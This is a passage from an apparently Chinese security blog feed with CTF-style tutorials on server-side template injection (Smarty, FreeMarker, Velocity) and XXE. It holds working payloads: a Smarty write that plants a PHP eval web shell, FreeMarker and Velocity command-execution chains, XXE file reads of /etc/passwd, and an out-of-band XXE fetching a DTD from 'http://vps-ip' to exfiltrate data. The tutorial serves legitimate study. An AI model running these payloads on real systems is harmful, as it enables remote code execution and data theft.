class="token operator">=</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token variable">$_error_reporting</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token constant">E_NOTICE</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token constant">E_WARNING</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_file_perms</span> <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token variable">$old_umask</span> <span class="token operator">=</span> <span class="token function">umask</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>        <span class="token variable">$_dirpath</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// if subdirs, create dir structure</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_dirpath</span> <span class="token operator">!==</span> <span class="token string">'.'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_dirpath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$_dirpath</span><span class="token punctuation">,</span> <span class="token variable">$smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_dir_perms</span> <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token number">0777</span> <span class="token punctuation">:</span> <span class="token variable">$smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_dir_perms</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>        <span class="token comment" spellcheck="true">// write to tmp file, then move to overt file lock race condition</span>        <span class="token variable">$_tmp_file</span> <span class="token operator">=</span> <span class="token variable">$_dirpath</span> <span class="token punctuation">.</span> <span class="token constant">DS</span> <span class="token punctuation">.</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token string">'wrt'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_tmp_file</span><span class="token punctuation">,</span> <span class="token variable">$_contents</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token variable">$_error_reporting</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SmartyException</span><span class="token punctuation">(</span><span class="token string">"unable to write file &amp;#123;$_tmp_file&amp;#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>        <span class="token comment" spellcheck="true">/*         * Windows' rename() fails if the destination exists,         * Linux' rename() properly handles the overwrite.         * Simply unlink()ing a file might cause other processes         * currently reading that file to fail, but linux' rename()         * seems to be smart enough to handle that for us.         */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>Smarty<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$_IS_WINDOWS</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token comment" spellcheck="true">// remove original file</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$_filepath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$_filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>            <span class="token comment" spellcheck="true">// rename tmp file</span>            <span class="token variable">$success</span> <span class="token operator">=</span> @<span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$_tmp_file</span><span class="token punctuation">,</span> <span class="token variable">$_filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else &amp;#123;</span>            <span class="token comment" spellcheck="true">// rename tmp file</span>            <span class="token variable">$success</span> <span class="token operator">=</span> @<span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$_tmp_file</span><span class="token punctuation">,</span> <span class="token variable">$_filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$success</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                <span class="token comment" spellcheck="true">// remove original file</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$_filepath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$_filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>                <span class="token comment" spellcheck="true">// rename tmp file</span>                <span class="token variable">$success</span> <span class="token operator">=</span> @<span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$_tmp_file</span><span class="token punctuation">,</span> <span class="token variable">$_filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$success</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token variable">$_error_reporting</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SmartyException</span><span class="token punctuation">(</span><span class="token string">"unable to write file &amp;#123;$_filepath&amp;#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_file_perms</span> <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token comment" spellcheck="true">// set file permissions</span>            <span class="token function">chmod</span><span class="token punctuation">(</span><span class="token variable">$_filepath</span><span class="token punctuation">,</span> <span class="token variable">$smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_file_perms</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">umask</span><span class="token punctuation">(</span><span class="token variable">$old_umask</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>        <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token variable">$_error_reporting</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>writeFile 函数第三个参数一个 Smarty 类型，后来找到了 self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">clearConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">clearConfig</span><span class="token punctuation">(</span><span class="token variable">$varname</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">return</span> Smarty_Internal_Extension_Config<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">clearConfig</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$varname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>payload<span class="token punctuation">:</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,</span><span class="token string">"&lt;?php eval($_GET['cmd']); ?>"</span><span class="token punctuation">,</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">clearConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre><h4 id="常规利用"><a href="#常规利用" class="headerlink" title="常规利用"></a>常规利用</h4><ul><li><p>{$smarty.version}  #获取smarty的版本号</p></li><li><p>{php}phpinfo();{&#x2F;php}  #执行相应的php代码，python3中已废弃{php}</p></li><li><p>{if phpinfo()}{&#x2F;if}</p></li></ul><h2 id="java-ssti"><a href="#java-ssti" class="headerlink" title="java ssti"></a>java ssti</h2><p>java常见的模板引擎有FreeMarker，velocity等</p><h3 id="FreeMarker"><a href="#FreeMarker" class="headerlink" title="FreeMarker"></a>FreeMarker</h3><p>freemarker的基本语法也不再讲述</p><p>可以看这里学习：<a href="https://www.cnblogs.com/JealousGirl/p/freemarker.html">Freemarker的基本语法及入门基础</a></p><p><img src="https://bu.dusays.com/2021/10/21/b45c3da94c8f9.png"></p><p>FreeMarker模板代码：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Welcome!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>　<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#–这是注释–</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Welcome $<span class="token entity" title="&#123;">&amp;#123;</span>user<span class="token entity" title="&#125;">&amp;#125;</span>!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Our latest product:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>$&amp;#123;latestProduct.url&amp;#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$<span class="token entity" title="&#123;">&amp;#123;</span>latestProduct.name<span class="token entity" title="&#125;">&amp;#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>模板文件存放在Web服务器上，就像通常存放静态HTML页面那样。当有人来访问这个页面， FreeMarker将会介入执行，然后动态转换模板，用最新的数据内容替换模板中 ${…} 的部分， 之后将结果发送到访问者的Web浏览器中。</p><p>这个模板主要用于 java ，用户可以通过实现 TemplateModel 来用 new 创建任意 Java 对象。?new() 是其高级内置函数。</p><p>可以看freemarker的文档：<a href="https://freemarker.apache.org/docs/ref_builtins_expert.html">https://freemarker.apache.org/docs/ref_builtins_expert.html</a></p><p>用法如下：</p><pre class=" language-text"><code class="language-text"><＃ - 创建一个用户定义的指令，调用类的参数构造函数 - ><#assign word_wrapp ="com.acmee.freemarker.WordWrapperDirective"?new（）><＃ - 创建一个用户定义的指令，用一个数字参数调用构造函数 - ><#assign word_wrapp_narrow ="com.acmee.freemarker.WordWrapperDirective"?new（40）></code></pre><p>那么我么可以调用freemarker中的内置执行命令的对象 Execute</p><ol><li><p>在 freemarker.templete.utility 里面有个 Execute 类，这个类会执行它的参数，因此我们可以new一个Execute对象，传输可执行命令来达到rce</p><p>payload：</p><pre class=" language-text"><code class="language-text"><#assign value="freemarker.template.utility.Execute"?new()>$&#123;value("whoami")&#125;</code></pre></li><li><p>在freemarker.templete.utility里有个 ObjectConstructor 类，这个类会把它的参数作为名称，构造了一个实例化对象。因此我们可以构造</p><p>payload：</p><pre class=" language-text"><code class="language-text"><#assign value="freemarker.template.utility.ObjectConstructor"?new()>$&#123;value("java.lang.ProcessBuilder","whoami").start()&#125;</code></pre></li><li><p>在freemarker.template.utility里面的 JythonRuntime，可以通过自定义标签的方式，执行Python命令。</p><p>payload：</p><pre class=" language-text"><code class="language-text"><#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("whoami")</@value></code></pre></li></ol><p>FreeMarker 是最流行的 Java 模板语言之一，也是最常向用户展示的语言。这让人惊讶的是，官方网站解释了允许用户提供模板的危险：</p><blockquote><ol start="23"><li>我可以允许用户上传模板吗？有什么安全隐患？</li></ol><p>通常，您不应允许这样做，除非这些用户是系统管理员或其他受信任的人员。将模板视为源代码的一部分，就像 *.java 文件一样。如果您仍希望允许用户上传模板，请考虑以下事项：</p><p><a href="http://freemarker.org/docs/app_faq.html#faq_template_uploading_security">http://freemarker.org/docs/app_faq.html#faq_template_uploading_security</a></p></blockquote><p>在拒绝服务等一些较小的风险背后，我们发现：</p><p>在 new 的内置（Configuration.setNewBuiltinClassResolver， Environment.setNewBuiltinClassResolver）：它用于 “com.example.SomeClass”?new() ，对于部分在Java中实现但在普通模板中不需要的FTL库来说很重要。虽然 new 不会实例化不是 TemplateModel-s 的类，但FreeMarker 包含一个可用于创建任意 Java 对象的 TemplateModel类。类路径中可能存在其他“危险”的TemplateModel-s。另外，即使一个类没有实现 TemplateModel，它的静态初始化也会运行。为了避免这些，您应该使用一个 TemplateClassResolver来限制可访问的类（可能基于模板要求的类），例如 TemplateClassResolver.ALLOWS_NOTHING_RESOLVER。</p><p>这个警告有点神秘，但它确实表明新的内置程序可能提供了一个有希望的利用途径。让我们看看有关new的文档：</p><blockquote><p>这个内置可能是一个安全问题，因为模板作者可以创建任意 Java 对象，然后使用它们，只要它们实现 TemplateModel。此外，模板作者可以为甚至没有实现 TemplateModel 的类触发静态初始化。[snip] 如果您允许不太受信任的用户上传模板，那么您绝对应该研究这个主题。</p><p><a href="http://freemarker.org/docs/ref_builtins_expert.html#ref_builtin_new">http://freemarker.org/docs/ref_builtins_expert.html#ref_builtin_new</a></p></blockquote><p>我们可以去JavaDoc去看看有没有可用的类</p><p><img src="https://bu.dusays.com/2021/10/23/f57a53256ba75.png"></p><p>简单利用：</p><pre class=" language-text"><code class="language-text"><#assign ex="freemarker.template.utility.Execute"?new()> $&#123; ex("whoami") &#125;</code></pre><p>来源：<a href="https://portswigger.net/research/server-side-template-injection">https://portswigger.net/research/server-side-template-injection</a></p><h3 id="Velocity"><a href="#Velocity" class="headerlink" title="Velocity"></a>Velocity</h3><p><a href="https://www.jianshu.com/p/378827f1dfc8">Velocity</a>是另一种流行的 Java 模板语言，利用起来比较棘手。没有“安全注意事项”页面可以帮助指出最危险的函数，也没有明显的默认变量列表。以下屏幕截图显示了用于暴力破解变量名称的 Burp Intruder 工具，变量名称位于“有效负载”列的左侧，右侧是服务器的输出。</p><p><img src="https://bu.dusays.com/2021/10/23/3b4b9532400dc.png"></p><p>本类变量（高亮）看起来特别有前途，因为它返回一个通用对象。</p><p>一种方法和一种属性脱颖而出：</p><p>$class.inspect(类&#x2F;对象&#x2F;字符串)&#x3D;&#x3D;&#x3D;&#x3D;&gt;返回检查指定类或对象的新 ClassTool 实例<br>$class.type&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;返回正在检查的实际类</p><p>我们可以将$class.inspect与$class.type 链接起来以获取对任意对象的引用。然后我们可以使用<a href="https://docs.oracle.com/javase/7/docs/api/java/lang/Runtime.html#exec(java.lang.String)">Runtime.exec()</a>在目标系统上执行任意 shell 命令。</p><pre class=" language-text"><code class="language-text">$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor()该模板旨在导致明显的时间延迟。</code></pre><p>获取 shell 命令的输出有点棘手（毕竟这是 Java）：</p><pre class=" language-text"><code class="language-text">#set($str=$class.inspect("java.lang.String").type)#set($chr=$class.inspect("java.lang.Character").type)#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end</code></pre><p><a href="https://xz.aliyun.com/t/8135">CVE-2019-3396 Confluence Velocity SSTI漏洞浅析</a></p>]]></content>
      
      
      <categories>
          
          <category> 注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE(xml外部实体注入)</title>
      <link href="/2021/10/10/xml-wai-bu-shi-ti-zhu-ru/"/>
      <url>/2021/10/10/xml-wai-bu-shi-ti-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h2 id="xml基础"><a href="#xml基础" class="headerlink" title="xml基础"></a>xml基础</h2><p>xml 指可扩展标记语言，设计宗旨是用来传输数据</p><p>DTD（document type define文档类型定义）作用是定义XML文档的合法构建模块<br>DTD可以在XML文档中声明，也可以外部引用</p><span id="more"></span><p>根据类型划分：</p><ul><li><p>一般实体<br>一般实体（通用实体）的声明语法：<code>&lt;!ENTITY 实体名 &quot;实体内容&quot;&gt;</code><br>引用实体的方式：<code>&amp;实体名;</code><br>它在DTD中定义，在XML文档中引用</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM "file:///c:/windows/win.ini"></span> ]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updateProfile</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>firstname</span><span class="token punctuation">></span></span>Lees<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>firstname</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lastname</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lastname</span><span class="token punctuation">></span></span>  ...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updateProfile</span><span class="token punctuation">></span></span></code></pre></li><li><p>参数实体<br>声明语法：<code>&lt;!ENTITY % 实体名 &quot;实体内容&quot;&gt;</code><br>引用实体的方式：<code>%实体名;</code><br>只能在DTD中使用，只有在DTD文件中，参数实体的声明才能引用其他实体。<br>和通用实体一样，也可以外部引用。</p></li></ul><p><img src="https://bu.dusays.com/2022/04/06/0893692b657ce.png"></p><p>还有另一种划分标准</p><ul><li>内部实体<br>内部声明</li></ul><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE test [&lt;!ENTITY writer "Bill Gates"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">copyright</span> <span class="token attr-name">"Copyright</span> <span class="token attr-name">W3School.com.cn"</span><span class="token punctuation">></span></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">></span></span><span class="token entity" title="&writer;">&amp;writer;</span>&amp;copyright;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>test</span><span class="token punctuation">></span></span></code></pre><ul><li>外部实体<br>外部声明（引用外部DTD）</li></ul><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE test [&lt;!ENTITY writer SYSTEM "http://www.example.com/123.dtd"></span>&lt;!ENTITY copyright SYSTEM "http://www.example.com/123.dtd">]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>author</span><span class="token punctuation">></span></span><span class="token entity" title="&writer;">&amp;writer;</span>&amp;copyright;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>author</span><span class="token punctuation">></span></span></code></pre><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>练习题源代码:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'mode'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'mode'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token comment" spellcheck="true">// 有回显XXE</span>    <span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input');</span>    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dom</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xml</span><span class="token punctuation">,</span> <span class="token constant">LIBXML_NOENT</span><span class="token operator">|</span><span class="token constant">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$creds</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'mode'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token comment" spellcheck="true">// 无回显XXE</span>    <span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input');</span>    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dom</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xml</span><span class="token punctuation">,</span> <span class="token constant">LIBXML_NOENT</span><span class="token operator">|</span><span class="token constant">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// echo $cred;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token operator">></span></code></pre><p>做ctf题目时大部分都不会给出源码,这时就通过抓包看http头,比如说 post提交,看提交的数据是不是xml格式,不是的话就不要往xxe方向解题(90%)</p><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><p>payload: </p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE creds [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>creds</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>creds</span><span class="token punctuation">></span></span>通常在读文件后再加个过滤器避免特殊的一些字符打印不出来"php://filter/convert.base64-encode/resource=/etc/passwd"bp截包,修改Content-Type: application/xml,post提交,mode=1,把这段代码直接打过去</code></pre><p><img src="https://bu.dusays.com/2021/10/10/e230fa54fda07.png"></p><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>反弹shell<br>在云服务器上放置如下代码:</p><p><img src="https://bu.dusays.com/2022/04/06/82261378fde89.png"></p><p>POST提交</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM "http://vps-ip/test.dtd"></span>%remote;%int;%send;]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">/></span></span></code></pre><p><img src="https://bu.dusays.com/2021/10/10/42976eacf22a2.png"></p><p>开源练习题：2019NCTF-fake xml cookbook<br>           2019NCTF-true xml cookbook</p><p>读文件敏感<br>&#x2F;etc&#x2F;hosts 存储域名解析的缓存<br>&#x2F;etc&#x2F;passwd 用户密码<br>&#x2F;proc&#x2F;net&#x2F;arp 每个网络接口的arp表中的dev包</p><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>例题：<a href="https://github.com/CTFTraining/csawqal_2019_web_unagi">https://github.com/CTFTraining/csawqal_2019_web_unagi</a><br>使用iconv命令<br>iconv -f utf-8 -t utf-16 1.xml &gt; 2.xml</p><p>也可以改encoding为其他编码（utf-7），文件内容也要记得改</p><h3 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h3><ul><li><p>SYSTEM过滤<br>使用PUBLIC “lees”  (“”内是随意字符串)</p></li><li><p>远程DTD过滤<br>dtd文件后缀可以任意，只要内容是dtd就行<br>在服务器上部署一个dtd文件，让后去请求就绕过了</p></li></ul><h3 id="文档开头检测"><a href="#文档开头检测" class="headerlink" title="文档开头检测"></a>文档开头检测</h3><p>通常xxe漏洞存在XML文档的开头，有的waf会检测文件开头，但是XML格式在设置标签属性的格式时允许使用任意数量的空格，因此我们可以在&lt;?xml ?&gt;或&lt;?DOCTYPE&gt;中插入大量的空格绕过。</p><h4 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h4><p>比如一个场景回显结果都放在一个标签里，不直接输出，先xml解析，但是文本中的 &lt; 和 &amp; 等字符会干扰正常的xml parser 然后报错，这是就需要用到CDATA。CDATA 